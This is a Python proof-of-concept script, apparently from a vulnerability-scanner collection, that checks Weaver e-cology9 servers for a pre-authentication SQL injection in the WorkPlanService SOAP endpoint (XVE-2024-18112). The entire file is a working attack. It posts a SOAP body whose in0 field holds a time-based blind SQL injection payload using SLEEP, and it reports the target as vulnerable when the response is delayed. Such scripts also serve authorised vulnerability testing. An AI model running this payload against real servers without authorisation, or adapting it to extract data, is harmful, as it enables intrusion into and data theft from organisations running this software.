import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微e-cology9接口WorkPlanService前台SQL注入漏洞(XVE-2024-18112)',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Content-Type': 'text/xml;charset=UTF-8',
        'Connection':'close'
    }
    data='''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
    <soapenv:Header/>
      <soapenv:Body>
      <web:deleteWorkPlan>
         <!--type: string-->
         <web:in0>(SELECT 8544 FROM (SELECT(SLEEP(6-(IF(27=27,0,5)))))NZeo)</web:in0>
         <!--type: int-->
         <web:in1>22</web:in1> 
      </web:deleteWorkPlan>
      </soapenv:Body>
</soapenv:Envelope>
    '''
    vurl = urllib.parse.urljoin(url, "/services/WorkPlanService")

    try:
        response = requests.post(vurl, headers=headers, data=data, timeout=10)
        if response.status_code == 200 and response.elapsed.total_seconds() > 4:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult